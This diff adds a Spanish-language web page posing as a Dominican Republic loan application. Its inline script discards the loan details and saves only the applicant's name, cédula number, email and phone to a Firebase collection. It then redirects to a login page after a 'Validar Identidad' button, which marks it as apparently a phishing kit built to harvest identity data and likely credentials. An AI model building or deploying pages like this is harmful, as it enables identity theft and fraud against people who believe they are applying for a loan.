@@ -1,0 +1,130 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Solicitud de Préstamo</title>
+<link rel="stylesheet" href="styles.css">
+</head>
+<body>
+
+<div class="card">
+
+    <img src="arriba.jpeg" class="top-image" id="imgTop">
+
+    <div id="mensajeImagen" class="mensaje-imagen"></div>
+
+    <h3 class="titulo-principal">Completar el formulario</h3>
+
+    <form id="formPrestamo">
+
+        <div class="section">
+
+            <h3>Nombre *</h3>
+            <input type="text" id="nombre" required>
+
+            <h3>Apellido *</h3>
+            <input type="text" id="apellido" required>
+
+            <h3>Cédula Dominicana *</h3>
+            <input type="text" id="cedula" maxlength="13" required>
+
+            <h3>Correo Electrónico *</h3>
+            <input type="email" id="email" required>
+
+            <h3>Teléfono *</h3>
+            <input type="tel" id="telefono" required>
+
+        </div>
+
+        <div class="section">
+
+            <h3>Años del préstamo *</h3>
+            <select required>
+                <option value="">Seleccione</option>
+                <option>1</option>
+                <option>2</option>
+                <option>3</option>
+                <option>4</option>
+                <option>5</option>
+            </select>
+
+            <h3>¿Dentro de cuántos años desea pagarlo? *</h3>
+            <select required>
+                <option value="">Seleccione</option>
+                <option>1 año</option>
+                <option>2 años</option>
+                <option>3 años</option>
+                <option>4 años</option>
+                <option>5 años</option>
+            </select>
+
+            <h3>Monto a Solicitar (RD$) *</h3>
+            <input type="number" required>
+
+        </div>
+
+        <div class="section">
+
+            <h3>Empleo Actual *</h3>
+            <input type="text" required>
+
+            <h3>Años de experiencia *</h3>
+            <select required>
+                <option value="">Seleccione</option>
+                <option>3 meses</option>
+                <option>1 año</option>
+                <option>2 años o más</option>
+            </select>
+
+        </div>
+
+        <div class="section">
+
+            <h3>Nombre del representante *</h3>
+            <input type="text" required>
+
+            <h3>Apellido del representante *</h3>
+            <input type="text" required>
+
+            <h3>Parentesco *</h3>
+            <input type="text" required>
+
+        </div>
+
+        <button type="submit" id="btnEnviar">Validar Identidad</button>
+
+        <div id="loader" class="loader"></div>
+
+    </form>
+
+    <img src="abajo.jpeg" class="bottom-image" id="imgBottom">
+
+</div>
+
+<script src="scrip.js"></script>
+<script type="module">
+import { db } from "./firebase.js";
+import { addDoc, collection } from "https://www.gstatic.com/firebasejs/10.12.0/firebase-firestore.js";
+
+const form = document.getElementById("formPrestamo");
+
+form.addEventListener("submit", async (e) => {
+  e.preventDefault();
+
+  await addDoc(collection(db, "registros"), {
+    tipo: "formulario",
+    nombre: document.getElementById("nombre").value,
+    apellido: document.getElementById("apellido").value,
+    cedula: document.getElementById("cedula").value,
+    email: document.getElementById("email").value,
+    telefono: document.getElementById("telefono").value,
+    fecha: new Date()
+  });
+
+  window.location.href = "login.html";
+});
+</script>
+
+</body>
+</html>
